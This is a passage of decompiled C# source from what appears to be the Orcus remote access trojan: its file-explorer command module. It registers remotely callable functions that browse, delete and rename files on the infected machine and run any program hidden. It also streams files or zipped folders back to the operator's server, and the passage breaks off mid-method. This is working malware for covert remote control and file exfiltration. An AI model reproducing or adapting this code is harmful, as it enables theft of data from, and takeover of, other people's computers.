using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;
using System.Windows.Forms;
using ICSharpCode.SharpZipLib.Zip;
using Orcus.Native;
using Orcus.Native.Shell;
using Orcus.Plugins;
using Orcus.Shared.Commands.FileExplorer;
using Orcus.Shared.DataTransferProtocol;
using Orcus.Shared.NetSerializer;
using Orcus.Shared.Utilities;
using Orcus.Utilities;
using ShellLibrary;
using ShellLibrary.Native;

namespace Orcus.Commands.FileExplorer;

[DisallowMultipleThreads]
public class FileExplorerCommand : Command
{
	private readonly List<Guid> _canceledDownloads;

	private static readonly Dictionary<string, List<ProcessingEntry>> ProcessingEntries = new Dictionary<string, List<ProcessingEntry>>();

	private static readonly Dictionary<string, CancellationTokenEx> ProcessEntryCancellationTokens = new Dictionary<string, CancellationTokenEx>();

	private static readonly object ProcessingEntriesLock = new object();

	private readonly DtpProcessor _dtpProcessor;

	private readonly UploadService _uploadService;

	private IConnectionInfo _connectionInfo;

	private bool _isDisposed;

	private readonly Orcus.Utilities.Lazy<Serializer> _processingEntryUpdateSerializer = new Orcus.Utilities.Lazy<Serializer>(() => new Serializer(typeof(ProcessingEntryUpdate)));

	private readonly Orcus.Utilities.Lazy<Serializer> _processingEntrySerializer = new Orcus.Utilities.Lazy<Serializer>(() => new Serializer(typeof(ProcessingEntry)));

	private static event EventHandler<ProcessingEntriesChangedEventArgs> ProcessingEntriesChanged;

	public FileExplorerCommand()
	{
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		//IL_008c: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_0121: Unknown result type (might be due to invalid IL or missing references)
		//IL_0126: Unknown result type (might be due to invalid IL or missing references)
		//IL_012c: Expected O, but got Unknown
		//IL_0163: Unknown result type (might be due to invalid IL or missing references)
		//IL_0168: Unknown result type (might be due to invalid IL or missing references)
		//IL_016e: Expected O, but got Unknown
		//IL_01cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d7: Expected O, but got Unknown
		//IL_020e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0213: Unknown result type (might be due to invalid IL or missing references)
		//IL_0219: Expected O, but got Unknown
		//IL_0243: Unknown result type (might be due to invalid IL or missing references)
		//IL_0248: Unknown result type (might be due to invalid IL or missing references)
		//IL_024e: Expected O, but got Unknown
		//IL_0278: Unknown result type (might be due to invalid IL or missing references)
		//IL_027d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0283: Expected O, but got Unknown
		//IL_02a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b2: Expected O, but got Unknown
		//IL_02d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02db: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e1: Expected O, but got Unknown
		//IL_0305: Unknown result type (might be due to invalid IL or missing references)
		//IL_030a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0310: Expected O, but got Unknown
		//IL_033a: Unknown result type (might be due to invalid IL or missing references)
		//IL_033f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0345: Expected O, but got Unknown
		//IL_037c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0381: Unknown result type (might be due to invalid IL or missing references)
		//IL_0387: Expected O, but got Unknown
		//IL_03b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03bc: Expected O, but got Unknown
		//IL_03d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e3: Expected O, but got Unknown
		//IL_03f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ff: Expected O, but got Unknown
		//IL_0411: Unknown result type (might be due to invalid IL or missing references)
		//IL_0421: Expected O, but got Unknown
		//IL_0433: Unknown result type (might be due to invalid IL or missing references)
		//IL_0443: Expected O, but got Unknown
		//IL_0455: Unknown result type (might be due to invalid IL or missing references)
		//IL_045f: Expected O, but got Unknown
		//IL_0471: Unknown result type (might be due to invalid IL or missing references)
		//IL_0481: Expected O, but got Unknown
		//IL_04a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_04a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ab: Expected O, but got Unknown
		//IL_04c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d2: Expected O, but got Unknown
		//IL_04e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ee: Expected O, but got Unknown
		//IL_050d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0512: Unknown result type (might be due to invalid IL or missing references)
		//IL_0518: Expected O, but got Unknown
		//IL_052f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0539: Expected O, but got Unknown
		_uploadService = new UploadService();
		_canceledDownloads = new List<Guid>();
		ProcessingEntriesChanged += OnProcessingEntriesChanged;
		_dtpProcessor = new DtpProcessor();
		DtpProcessor dtpProcessor = _dtpProcessor;
		object obj = _003C_003Ec._003C_003E9__13_0;
		if (obj == null)
		{
			DtpFunction val = delegate
			{
				//IL_0000: Unknown result type (might be due to invalid IL or missing references)
				//IL_0005: Unknown result type (might be due to invalid IL or missing references)
				//IL_0010: Unknown result type (might be due to invalid IL or missing references)
				//IL_0021: Unknown result type (might be due to invalid IL or missing references)
				//IL_002d: Expected O, but got Unknown
				//IL_0075: Unknown result type (might be due to invalid IL or missing references)
				//IL_0080: Expected O, but got Unknown
				RootEntryCollection val31 = new RootEntryCollection();
				val31.set_RootDirectories(DirectoryHelper.GetNamespaceDirectories());
				val31.set_ComputerDirectory(DirectoryHelper.GetDirectoryEntry(DirectoryInfoEx.MyComputerDirectory, null));
				val31.set_ComputerDirectoryEntries(DirectoryHelper.GetComputerDirectoryEntries());
				RootEntryCollection val32 = val31;
				DriveInfo[] drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo2 in drives)
				{
					if (val32.get_ComputerDirectoryEntries().All((IFileExplorerEntry x) => x.get_Path() != driveInfo2.RootDirectory.FullName))
					{
						val32.get_ComputerDirectoryEntries().Add((IFileExplorerEntry)(object)DirectoryHelper.GetDirectoryEntry(new DirectoryInfoEx(driveInfo2.RootDirectory.FullName), null));
					}
				}
				return val32;
			};
			obj = (object)val;
			_003C_003Ec._003C_003E9__13_0 = val;
		}
		dtpProcessor.RegisterFunction("GetRootElements", (DtpFunction)obj, new Type[5]
		{
			typeof(RootEntryCollection),
			typeof(FileEntry),
			typeof(DirectoryEntry),
			typeof(DriveDirectoryEntry),
			typeof(ProcessingEntry)
		});
		DtpProcessor dtpProcessor2 = _dtpProcessor;
		object obj2 = _003C_003Ec._003C_003E9__13_2;
		if (obj2 == null)
		{
			DtpFunction val2 = (DtpParameters parameters) => DirectoryHelper.GetDirectories(new DirectoryInfoEx(parameters.GetString(0)));
			obj2 = (object)val2;
			_003C_003Ec._003C_003E9__13_2 = val2;
		}
		dtpProcessor2.RegisterFunction("GetDirectories", (DtpFunction)obj2, new Type[1] { typeof(DriveDirectoryEntry) });
		DtpProcessor dtpProcessor3 = _dtpProcessor;
		object obj3 = _003C_003Ec._003C_003E9__13_3;
		if (obj3 == null)
		{
			DtpFunction val3 = delegate(DtpParameters parameters)
			{
				//IL_010e: Unknown result type (might be due to invalid IL or missing references)
				//IL_0118: Expected O, but got Unknown
				List<string> value20 = parameters.GetValue<List<string>>(0);
				bool bool3 = parameters.GetBool(1);
				List<List<IFileExplorerEntry>> list3 = new List<List<IFileExplorerEntry>>();
				for (int j = 0; j < value20.Count; j++)
				{
					string text2 = value20[j];
					if (j == 0 && bool3)
					{
						List<IFileExplorerEntry> directoryEntries = DirectoryHelper.GetDirectoryEntries(text2);
						list3.Add(directoryEntries);
						lock (ProcessingEntriesLock)
						{
							if (ProcessingEntries.TryGetValue(FileExtensions.NormalizePath(text2), out var value21))
							{
								foreach (IFileExplorerEntry fileExplorerEntry in value21.Cast<IFileExplorerEntry>())
								{
									IFileExplorerEntry val30 = ((IEnumerable<IFileExplorerEntry>)directoryEntries).FirstOrDefault((Func<IFileExplorerEntry, bool>)((IFileExplorerEntry x) => x.get_Name().Equals(fileExplorerEntry.get_Name(), StringComparison.OrdinalIgnoreCase)));
									if (val30 != null)
									{
										directoryEntries.Remove(val30);
									}
									directoryEntries.Add(fileExplorerEntry);
								}
							}
						}
						continue;
					}
					if (text2.Length > 3)
					{
						try
						{
							list3.Add(DirectoryHelper.GetDirectoriesFast(text2).Cast<IFileExplorerEntry>().ToList());
						}
						catch (Exception)
						{
							goto IL_010b;
						}
						continue;
					}
					goto IL_010b;
					IL_010b:
					list3.Add(DirectoryHelper.GetDirectories(new DirectoryInfoEx(text2)).Cast<IFileExplorerEntry>().ToList());
				}
				return list3;
			};
			obj3 = (object)val3;
			_003C_003Ec._003C_003E9__13_3 = val3;
		}
		dtpProcessor3.RegisterFunction("GetPathContent", (DtpFunction)obj3, new Type[4]
		{
			typeof(PackedDirectoryEntry),
			typeof(DriveDirectoryEntry),
			typeof(FileEntry),
			typeof(ProcessingEntry)
		});
		DtpProcessor dtpProcessor4 = _dtpProcessor;
		object obj4 = _003C_003Ec._003C_003E9__13_5;
		if (obj4 == null)
		{
			DtpFunction val4 = (DtpParameters parameters) => DirectoryHelper.GetDirectoryEntry(new DirectoryInfoEx(parameters.GetString(0)), null);
			obj4 = (object)val4;
			_003C_003Ec._003C_003E9__13_5 = val4;
		}
		dtpProcessor4.RegisterFunction("GetDirectory", (DtpFunction)obj4, new Type[1] { typeof(DriveDirectoryEntry) });
		DtpProcessor dtpProcessor5 = _dtpProcessor;
		object obj5 = _003C_003Ec._003C_003E9__13_6;
		if (obj5 == null)
		{
			DtpFunction val5 = (DtpParameters parameters) => Environment.ExpandEnvironmentVariables(parameters.GetString(0));
			obj5 = (object)val5;
			_003C_003Ec._003C_003E9__13_6 = val5;
		}
		dtpProcessor5.RegisterFunction("ExpandEnvironmentVariables", (DtpFunction)obj5, new Type[0]);
		DtpProcessor dtpProcessor6 = _dtpProcessor;
		object obj6 = _003C_003Ec._003C_003E9__13_7;
		if (obj6 == null)
		{
			DtpFunction val6 = delegate(DtpParameters parameters)
			{
				List<EntryInfo> value19 = parameters.GetValue<List<EntryInfo>>(0);
				List<string> list2 = new List<string>();
				foreach (EntryInfo item in value19)
				{
					try
					{
						if (item.get_IsDirectory())
						{
							Directory.Delete(item.get_Path(), recursive: true);
						}
						else
						{
							File.Delete(item.get_Path());
						}
						list2.Add(null);
					}
					catch (Exception ex13)
					{
						list2.Add(ex13.Message);
					}
				}
				return list2;
			};
			obj6 = (object)val6;
			_003C_003Ec._003C_003E9__13_7 = val6;
		}
		dtpProcessor6.RegisterFunction("RemoveEntries", (DtpFunction)obj6, new Type[0]);
		DtpProcessor dtpProcessor7 = _dtpProcessor;
		object obj7 = _003C_003Ec._003C_003E9__13_8;
		if (obj7 == null)
		{
			DtpProcedure val7 = delegate(DtpParameters parameters)
			{
				EntryInfo value18 = parameters.GetValue<EntryInfo>(0);
				string string11 = parameters.GetString(1);
				if (value18.get_IsDirectory())
				{
					Directory.Move(value18.get_Path(), Path.Combine(Path.GetDirectoryName(value18.get_Path()), string11));
				}
				else
				{
					File.Move(value18.get_Path(), Path.Combine(Path.GetDirectoryName(value18.get_Path()), string11));
				}
			};
			obj7 = (object)val7;
			_003C_003Ec._003C_003E9__13_8 = val7;
		}
		dtpProcessor7.RegisterProcedure("RenameEntry", (DtpProcedure)obj7);
		DtpProcessor dtpProcessor8 = _dtpProcessor;
		object obj8 = _003C_003Ec._003C_003E9__13_9;
		if (obj8 == null)
		{
			DtpProcedure val8 = delegate(DtpParameters parameters)
			{
				Directory.CreateDirectory(parameters.GetString(0));
			};
			obj8 = (object)val8;
			_003C_003Ec._003C_003E9__13_9 = val8;
		}
		dtpProcessor8.RegisterProcedure("CreateFolder", (DtpProcedure)obj8);
		DtpProcessor dtpProcessor9 = _dtpProcessor;
		object obj9 = _003C_003Ec._003C_003E9__13_10;
		if (obj9 == null)
		{
			DtpProcedure val9 = delegate(DtpParameters parameters)
			{
				//IL_011d: Unknown result type (might be due to invalid IL or missing references)
				string string10 = parameters.GetString(0);
				ShortcutInfo value17 = parameters.GetValue<ShortcutInfo>(1);
				Type typeFromCLSID = Type.GetTypeFromCLSID(new Guid("72C24DD5-D70A-438B-8A42-98424B88AFB8"));
				object obj16 = Activator.CreateInstance(typeFromCLSID);
				try
				{
					object obj17 = typeFromCLSID.InvokeMember("CreateShortcut", BindingFlags.InvokeMethod, null, obj16, new object[1] { string10 });
					try
					{
						typeFromCLSID.InvokeMember("TargetPath", BindingFlags.SetProperty, null, obj17, new object[1] { value17.get_TargetLocation() });
						typeFromCLSID.InvokeMember("Description", BindingFlags.SetProperty, null, obj17, new object[1] { value17.get_Description() });
						if (!string.IsNullOrEmpty(value17.get_WorkingDirectory()))
						{
							typeFromCLSID.InvokeMember("WorkingDirectory", BindingFlags.SetProperty, null, obj17, new object[1] { value17.get_WorkingDirectory() });
						}
						if (!string.IsNullOrEmpty(value17.get_IconPath()))
						{
							typeFromCLSID.InvokeMember("IconLocation", BindingFlags.SetProperty, null, obj17, new object[1] { $"{value17.get_IconPath()}, {value17.get_IconIndex()}" });
						}
						if (value17.get_Hotkey() != 0)
						{
							byte num = (byte)value17.get_Hotkey();
							byte b = (byte)(value17.get_Hotkey() >> 8);
							Keys val29 = (Keys)num;
							List<string> list = new List<string>();
							if ((b & 4) == 4)
							{
								list.Add("ALT");
							}
							if ((b & 2) == 2)
							{
								list.Add("CTRL");
							}
							if ((b & 1) == 1)
							{
								list.Add("SHIFT");
							}
							list.Add(((object)(Keys)(ref val29)).ToString()!.ToUpper());
							typeFromCLSID.InvokeMember("Hotkey", BindingFlags.SetProperty, null, obj17, new object[1] { string.Join("+", list.ToArray()) });
						}
						typeFromCLSID.InvokeMember("Save", BindingFlags.InvokeMethod, null, obj17, null);
					}
					finally
					{
						Marshal.FinalReleaseComObject(obj17);
					}
				}
				finally
				{
					Marshal.FinalReleaseComObject(obj16);
				}
			};
			obj9 = (object)val9;
			_003C_003Ec._003C_003E9__13_10 = val9;
		}
		dtpProcessor9.RegisterProcedure("CreateShortcut", (DtpProcedure)obj9);
		DtpProcessor dtpProcessor10 = _dtpProcessor;
		object obj10 = _003C_003Ec._003C_003E9__13_11;
		if (obj10 == null)
		{
			DtpFunction val10 = delegate(DtpParameters parameters)
			{
				//IL_0006: Unknown result type (might be due to invalid IL or missing references)
				//IL_000c: Expected O, but got Unknown
				//IL_0014: Unknown result type (might be due to invalid IL or missing references)
				//IL_001e: Expected O, but got Unknown
				//IL_003e: Unknown result type (might be due to invalid IL or missing references)
				DirectoryPropertiesInfo val28 = new DirectoryPropertiesInfo();
				DirectoryInfoEx directoryInfo3 = new DirectoryInfoEx(parameters.GetString(0));
				if (directoryInfo3.get_KnownFolderType() != null)
				{
					val28.set_DirectoryType((DirectoryType)1);
					val28.set_SpecialFolderType((SpecialFolderType)directoryInfo3.get_KnownFolderType().get_Category());
				}
				DriveInfo driveInfo = DriveInfo.GetDrives().FirstOrDefault((DriveInfo x) => x.RootDirectory.FullName == ((FileSystemInfoEx)directoryInfo3).get_FullName());
				if (driveInfo != null)
				{
					val28.set_DirectoryType((DirectoryType)2);
					if (driveInfo.IsReady)
					{
						val28.set_DriveFormat(driveInfo.DriveFormat);
					}
					else
					{
						val28.set_DriveFormat("Not ready");
					}
				}
				((PropertiesInfo)val28).set_CreationTime(((FileSystemInfoEx)directoryInfo3).get_CreationTimeUtc());
				((PropertiesInfo)val28).set_LastAccessTime(((FileSystemInfoEx)directoryInfo3).get_LastAccessTimeUtc());
				((PropertiesInfo)val28).set_LastWriteTime(((FileSystemInfoEx)directoryInfo3).get_LastWriteTimeUtc());
				((PropertiesInfo)val28).set_Attributes((FileAttributes)((FileSystemInfoEx)directoryInfo3).get_Attributes());
				return val28;
			};
			obj10 = (object)val10;
			_003C_003Ec._003C_003E9__13_11 = val10;
		}
		dtpProcessor10.RegisterFunction("GetDirectoryProperties", (DtpFunction)obj10, new Type[0]);
		DtpProcessor dtpProcessor11 = _dtpProcessor;
		object obj11 = _003C_003Ec._003C_003E9__13_13;
		if (obj11 == null)
		{
			DtpFunction val11 = delegate(DtpParameters parameters)
			{
				//IL_0006: Unknown result type (might be due to invalid IL or missing references)
				//IL_000c: Expected O, but got Unknown
				//IL_0014: Unknown result type (might be due to invalid IL or missing references)
				//IL_001e: Expected O, but got Unknown
				//IL_0139: Unknown result type (might be due to invalid IL or missing references)
				//IL_013e: Unknown result type (might be due to invalid IL or missing references)
				//IL_014b: Unknown result type (might be due to invalid IL or missing references)
				//IL_014e: Unknown result type (might be due to invalid IL or missing references)
				//IL_0153: Unknown result type (might be due to invalid IL or missing references)
				//IL_0161: Unknown result type (might be due to invalid IL or missing references)
				//IL_0164: Unknown result type (might be due to invalid IL or missing references)
				//IL_0169: Unknown result type (might be due to invalid IL or missing references)
				//IL_0177: Unknown result type (might be due to invalid IL or missing references)
				//IL_0181: Expected O, but got Unknown
				//IL_01c1: Unknown result type (might be due to invalid IL or missing references)
				//IL_030d: Unknown result type (might be due to invalid IL or missing references)
				//IL_0312: Unknown result type (might be due to invalid IL or missing references)
				//IL_031f: Unknown result type (might be due to invalid IL or missing references)
				//IL_032c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0338: Expected O, but got Unknown
				//IL_039f: Unknown result type (might be due to invalid IL or missing references)
				//IL_03a4: Unknown result type (might be due to invalid IL or missing references)
				//IL_03af: Unknown result type (might be due to invalid IL or missing references)
				//IL_03b7: Unknown result type (might be due to invalid IL or missing references)
				//IL_03c3: Expected O, but got Unknown
				//IL_03c9: Unknown result type (might be due to invalid IL or missing references)
				//IL_03ce: Unknown result type (might be due to invalid IL or missing references)
				//IL_03d9: Unknown result type (might be due to invalid IL or missing references)
				//IL_03e4: Unknown result type (might be due to invalid IL or missing references)
				//IL_03f0: Expected O, but got Unknown
				//IL_03fc: Unknown result type (might be due to invalid IL or missing references)
				//IL_0401: Unknown result type (might be due to invalid IL or missing references)
				//IL_040c: Unknown result type (might be due to invalid IL or missing references)
				//IL_042b: Unknown result type (might be due to invalid IL or missing references)
				//IL_0437: Expected O, but got Unknown
				FilePropertiesInfo val19 = new FilePropertiesInfo();
				FileInfoEx fileInfo4 = new FileInfoEx(parameters.GetString(0));
				try
				{
					val19.set_OpenWithProgramPath(FileHelper.AssocQueryString(AssocStr.Executable, ((FileSystemInfoEx)fileInfo4).get_Extension()));
					val19.set_OpenWithProgramName(FileHelper.AssocQueryString(AssocStr.FriendlyAppName, ((FileSystemInfoEx)fileInfo4).get_Extension()));
				}
				catch (Exception)
				{
				}
				try
				{
					val19.set_SizeOnDisk(FileHelper.GetFileSizeOnDisk(((FileSystemInfoEx)fileInfo4).get_FullName()));
				}
				catch (Exception)
				{
				}
				val19.set_Size(fileInfo4.get_Length());
				((PropertiesInfo)val19).set_CreationTime(((FileSystemInfoEx)fileInfo4).get_CreationTimeUtc());
				((PropertiesInfo)val19).set_LastAccessTime(((FileSystemInfoEx)fileInfo4).get_LastAccessTimeUtc());
				((PropertiesInfo)val19).set_LastWriteTime(((FileSystemInfoEx)fileInfo4).get_LastWriteTimeUtc());
				((PropertiesInfo)val19).set_Attributes((FileAttributes)((FileSystemInfoEx)fileInfo4).get_Attributes());
				val19.set_FileProperties(new List<FileProperty>());
				try
				{
					ShellObject val20 = ShellObject.FromParsingName(((FileSystemInfoEx)fileInfo4).get_FullName());
					if (val20 != (ShellObject)null)
					{
						ShellObject val21 = val20;
						try
						{
							foreach (IShellProperty item2 in (ReadOnlyCollection<IShellProperty>)(object)val20.get_Properties().get_DefaultPropertyCollection())
							{
								if (!string.IsNullOrEmpty(item2.get_CanonicalName()))
								{
									string value15 = ObjectToString(item2.get_ValueAsObject());
									if (!string.IsNullOrEmpty(value15))
									{
										ShellProperty val22 = new ShellProperty();
										((FileProperty)val22).set_Name(item2.get_CanonicalName());
										PropertyKey propertyKey = item2.get_PropertyKey();
										val22.set_FormatId(((PropertyKey)(ref propertyKey)).get_FormatId());
										propertyKey = item2.get_PropertyKey();
										val22.set_PropertyId(((PropertyKey)(ref propertyKey)).get_PropertyId());
										((FileProperty)val22).set_Value(value15);
										ShellProperty val23 = val22;
										string[] array2 = item2.get_CanonicalName().Split(new char[1] { '.' });
										if (array2.Length < 3)
										{
											((FileProperty)val23).set_Group((FilePropertyGroup)2);
										}
										else
										{
											try
											{
												((FileProperty)val23).set_Group((FilePropertyGroup)Enum.Parse(typeof(FilePropertyGroup), array2[1]));
											}
											catch (Exception)
											{
												((FileProperty)val23).set_Group((FilePropertyGroup)2);
											}
										}
										val19.get_FileProperties().Add((FileProperty)(object)val23);
									}
								}
							}
						}
						finally
						{
							((IDisposable)val21)?.Dispose();
						}
					}
				}
				catch (Exception)
				{
				}
				try
				{
					FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(((FileSystemInfoEx)fileInfo4).get_FullName());
					PropertyInfo[] properties = typeof(FileVersionInfo).GetProperties();
					foreach (PropertyInfo propertyInfo in properties)
					{
						object value16 = propertyInfo.GetValue(versionInfo, null);
						if (value16 != null && ((object)propertyInfo.PropertyType != typeof(string) || !string.IsNullOrEmpty((string)value16)) && !propertyInfo.Name.EndsWith("Part") && ((object)propertyInfo.PropertyType != typeof(bool) || (bool)value16))
						{
							string valueString;
							if (value16 is DateTime)
							{
								valueString = ((DateTime)value16).ToUniversalTime().ToString(CultureInfo.InvariantCulture);
							}
							else
							{
								valueString = value16.ToString();
							}
							if (!val19.get_FileProperties().Any((FileProperty x) => x.get_Value() == valueString))
							{
								List<FileProperty> fileProperties = val19.get_FileProperties();
								FileProperty val24 = new FileProperty();
								val24.set_Name(propertyInfo.Name);
								val24.set_Value(valueString);
								val24.set_Group((FilePropertyGroup)0);
								fileProperties.Add(val24);
							}
						}
					}
				}
				catch (Exception)
				{
				}
				if (new string[3] { ".exe", ".scr", ".com" }.Any((string x) => string.Equals(x, ((FileSystemInfoEx)fileInfo4).get_Extension(), StringComparison.OrdinalIgnoreCase)))
				{
					try
					{
						string fullName = AssemblyName.GetAssemblyName(((FileSystemInfoEx)fileInfo4).get_FullName()).FullName;
						List<FileProperty> fileProperties2 = val19.get_FileProperties();
						FileProperty val25 = new FileProperty();
						val25.set_Name("AssemblyName");
						val25.set_Value(fullName);
						val25.set_Group((FilePropertyGroup)1);
						fileProperties2.Add(val25);
						List<FileProperty> fileProperties3 = val19.get_FileProperties();
						FileProperty val26 = new FileProperty();
						val26.set_Name("IsAssembly");
						val26.set_Value("True");
						val26.set_Group((FilePropertyGroup)1);
						fileProperties3.Add(val26);
					}
					catch (Exception)
					{
					}
					try
					{
						List<FileProperty> fileProperties4 = val19.get_FileProperties();
						FileProperty val27 = new FileProperty();
						val27.set_Name("IsTrusted");
						val27.set_Value(AuthenticodeTools.IsTrusted(((FileSystemInfoEx)fileInfo4).get_FullName()).ToString());
						val27.set_Group((FilePropertyGroup)1);
						fileProperties4.Add(val27);
						return val19;
					}
					catch (Exception)
					{
						return val19;
					}
				}
				return val19;
			};
			obj11 = (object)val11;
			_003C_003Ec._003C_003E9__13_13 = val11;
		}
		dtpProcessor11.RegisterFunction("GetFileProperties", (DtpFunction)obj11, new Type[1] { typeof(ShellProperty) });
		DtpProcessor dtpProcessor12 = _dtpProcessor;
		object obj12 = _003C_003Ec._003C_003E9__13_16;
		if (obj12 == null)
		{
			DtpFunction val12 = delegate(DtpParameters parameters)
			{
				//IL_000a: Unknown result type (might be due to invalid IL or missing references)
				//IL_000f: Unknown result type (might be due to invalid IL or missing references)
				//IL_0010: Unknown result type (might be due to invalid IL or missing references)
				//IL_0026: Expected I4, but got Unknown
				string string9 = parameters.GetString(0);
				HashValueType value14 = parameters.GetValue<HashValueType>(1);
				HashAlgorithm hashAlgorithm = (int)value14 switch
				{
					0 => new MD5CryptoServiceProvider(), 
					1 => new SHA1CryptoServiceProvider(), 
					2 => new SHA256CryptoServiceProvider(), 
					3 => new SHA512CryptoServiceProvider(), 
					_ => throw new ArgumentOutOfRangeException(), 
				};
				using (hashAlgorithm)
				{
					using FileStream inputStream = new FileStream(string9, FileMode.Open, FileAccess.Read);
					return hashAlgorithm.ComputeHash(inputStream);
				}
			};
			obj12 = (object)val12;
			_003C_003Ec._003C_003E9__13_16 = val12;
		}
		dtpProcessor12.RegisterFunction("CalculateHashValue", (DtpFunction)obj12, new Type[0]);
		DtpProcessor dtpProcessor13 = _dtpProcessor;
		object obj13 = _003C_003Ec._003C_003E9__13_17;
		if (obj13 == null)
		{
			DtpProcedure val13 = delegate(DtpParameters parameters)
			{
				string string6 = parameters.GetString(0);
				string string7 = parameters.GetString(1);
				string string8 = parameters.GetString(2);
				bool bool2 = parameters.GetBool(3);
				Process process = new Process();
				process.StartInfo.FileName = string6;
				process.StartInfo.Arguments = string7;
				process.StartInfo.Verb = string8;
				process.StartInfo.CreateNoWindow = bool2;
				process.Start();
			};
			obj13 = (object)val13;
			_003C_003Ec._003C_003E9__13_17 = val13;
		}
		dtpProcessor13.RegisterProcedure("ExecuteFile", (DtpProcedure)obj13);
		_dtpProcessor.RegisterFunction("RequestFileUpload", (DtpFunction)delegate(DtpParameters parameters)
		{
			string string5 = parameters.GetString(0);
			byte[] value12 = parameters.GetValue<byte[]>(1);
			long value13 = parameters.GetValue<long>(2);
			return _uploadService.CreateNewUploadProcess(string5, value12, value13);
		}, new Type[0]);
		_dtpProcessor.RegisterProcedure("CancelFileUpload", (DtpProcedure)delegate(DtpParameters parameters)
		{
			Guid value11 = parameters.GetValue<Guid>(0);
			_uploadService.CancelUpload(value11);
		});
		_dtpProcessor.RegisterFunction("FinishFileUpload", (DtpFunction)delegate(DtpParameters parameters)
		{
			//IL_000f: Unknown result type (might be due to invalid IL or missing references)
			Guid value10 = parameters.GetValue<Guid>(0);
			return _uploadService.FinishUpload(value10);
		}, new Type[0]);
		byte[] guidData;
		byte[] buffer;
		int read;
		_dtpProcessor.RegisterFunction("InitializeDownload", (DtpFunction)delegate(DtpParameters parameters)
		{
			//IL_003b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0041: Expected O, but got Unknown
			//IL_005e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0090: Unknown result type (might be due to invalid IL or missing references)
			//IL_0096: Expected O, but got Unknown
			//IL_0126: Unknown result type (might be due to invalid IL or missing references)
			//IL_012c: Expected O, but got Unknown
			string string4 = parameters.GetString(0);
			bool @bool = parameters.GetBool(1);
			Guid guid = parameters.GetValue<Guid>(2);
			FileInfo fileToUpload;
			if (@bool)
			{
				DirectoryInfo directoryInfo2 = new DirectoryInfo(string4);
				if (!directoryInfo2.Exists)
				{
					return (object)new DownloadInformation((DownloadResult)1);
				}
				fileToUpload = new FileInfo(FileExtensions.GetFreeTempFileName());
				((Command)this).ResponseByte((byte)3, _connectionInfo);
				new FastZip().CreateZip(fileToUpload.FullName, directoryInfo2.FullName, true, (string)null, (string)null);
			}
			else
			{
				FileInfo fileInfo3 = new FileInfo(string4);
				if (!fileInfo3.Exists)
				{
					return (object)new DownloadInformation((DownloadResult)2);
				}
				fileToUpload = fileInfo3.CopyTo(FileExtensions.GetFreeTempFileName());
				((Command)this).ResponseByte((byte)4, _connectionInfo);
			}
			FileStream fileStream = new FileStream(fileToUpload.FullName, FileMode.Open, FileAccess.Read);
			byte[] array;
			using (MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider())
			{
				array = mD5CryptoServiceProvider.ComputeHash(fileStream);
			}
			fileStream.Position = 0L;
			new Thread((ThreadStart)delegate
			{
				try
				{
					using (fileStream)
					{
						guidData = guid.ToByteArray();
						buffer = new byte[4096];
						do
						{
							if ((read = fileStream.Read(buffer, 0, 4096)) <= 0)
							{
								return;
							}
							_connectionInfo.UnsafeResponse((Command)(object)this, read + 17, (Action<BinaryWriter>)delegate(BinaryWriter writer)
							{
								writer.Write((byte)5);
								writer.Write(guidData);
								writer.Write(buffer, 0, read);
							});
							if (_isDisposed)
							{
								return;
							}
						}
						while (!_canceledDownloads.Contains(guid));
						_canceledDownloads.Remove(guid);
					}
				}
				catch (Exception)
				{
					if (!_isDisposed)
					{
						((Command)this).ResponseBytes((byte)6, guid.ToByteArray(), _connectionInfo);
					}
				}
				finally
				{
					fileToUpload.Delete();
				}
			}).Start();
			return (object)new DownloadInformation(fileToUpload.Length, array);
		}, new Type[0]);
		_dtpProcessor.RegisterProcedure("CancelDownload", (DtpProcedure)delegate(DtpParameters parameters)
		{
			Guid value9 = parameters.GetValue<Guid>(0);
			_canceledDownloads.Add(value9);
		});
		_dtpProcessor.RegisterFunction("DownloadToServer", (DtpFunction)delegate(DtpParameters parameters)
		{
			string string3 = parameters.GetString(0);
			if (!parameters.GetBool(1))
			{
				FileInfo fileInfo = new FileInfo(string3);
				if (!fileInfo.Exists)
				{
					return (object)(DownloadResult)2;
				}
				new Thread((ThreadStart)delegate
				{
					_connectionInfo.get_ClientInfo().get_ClientOperator().get_DatabaseConnection()
						.PushFile(fileInfo.FullName, fileInfo.Name, DataMode.get_File());
				}).Start();
			}
			else
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(string3);
				if (!directoryInfo.Exists)
				{
					return (object)(DownloadResult)1;
				}
				new Thread((ThreadStart)delegate
				{
